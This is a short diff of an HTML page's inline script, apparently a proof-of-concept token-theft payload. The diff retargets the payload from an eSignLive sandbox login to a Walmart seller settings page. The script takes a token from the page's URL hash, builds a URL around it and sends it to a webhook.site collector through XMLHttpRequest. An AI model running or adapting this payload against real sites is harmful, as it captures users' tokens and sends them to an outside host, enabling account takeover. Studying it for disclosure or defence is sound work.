@@ -3,10 +3,10 @@
   <body>
 <script>
 var token = document.location.hash.substr(2).split("&")[0];
-var url = "https://sandbox.esignlive.com/a/login?" + token + "&target=https://sandbox.esignlive.com/a/";
+var url = "https://seller.walmart.com/settings/partner-profile/company-info" + token + "&target=https://seller.walmart.com/";
 alert(url);
 var x = new XMLHttpRequest();
-x.open("GET","https://webhook.site/5a2974f2-eb6a-4650-a341-e8f7e9fd76f0?open="+url,false);
+x.open("GET","https://webhook.site/9c1f3107-9755-44fa-a230-ec0523408be5?open="+url,false);
 x.send();
 </script>
 </body>
